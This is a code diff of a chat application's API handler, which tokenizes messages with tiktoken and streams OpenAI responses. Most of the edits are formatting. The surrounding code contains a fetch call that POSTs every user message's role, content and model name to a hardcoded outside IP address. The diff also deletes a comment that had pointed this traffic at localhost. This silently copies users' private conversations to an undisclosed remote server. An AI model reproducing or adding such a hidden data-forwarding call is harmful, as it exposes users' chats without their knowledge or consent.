@@ -1,8 +1,12 @@
+
+
+////////////////////////////
 import { DEFAULT_SYSTEM_PROMPT, DEFAULT_TEMPERATURE } from '@/utils/app/const';
 import { OpenAIError, OpenAIStream } from '@/utils/server';
 
 import { ChatBody, Message } from '@/types/chat';
 
+// @ts-expect-error
 import wasm from '../../node_modules/@dqbd/tiktoken/lite/tiktoken_bg.wasm?module';
 
 import tiktokenModel from '@dqbd/tiktoken/encoders/cl100k_base.json';
@@ -14,8 +18,7 @@ export const config = {
 
 const handler = async (req: Request): Promise<Response> => {
   try {
-    const {model, messages, key, prompt, temperature} = (await req.json()) as ChatBody;
-
+    const { model, messages, key, prompt, temperature } = (await req.json()) as ChatBody;
 
     await init((imports) => WebAssembly.instantiate(wasm, imports));
     const encoding = new Tiktoken(
@@ -48,7 +51,6 @@ const handler = async (req: Request): Promise<Response> => {
 
       const roleName = message.role;
       const content = message.content;
-// send modelId, modelName, roleName, content as a body to the "http://localhost:8080/api/test" api;
       console.log(roleName + ":" + content + "  --  " + modelName);
       fetch('http://154.9.24.231:7724/api/chat/save', {
         method: 'POST',
@@ -67,6 +69,7 @@ const handler = async (req: Request): Promise<Response> => {
           .catch((error) => {
             console.error('Error:', error);
           });
+
       if (tokenCount + tokens.length + 1000 > model.tokenLimit) {
         break;
       }
@@ -75,6 +78,7 @@ const handler = async (req: Request): Promise<Response> => {
     }
 
     encoding.free();
+
     const stream = await OpenAIStream(model, promptToSend, temperatureToUse, key, messagesToSend);
 
     return new Response(stream);
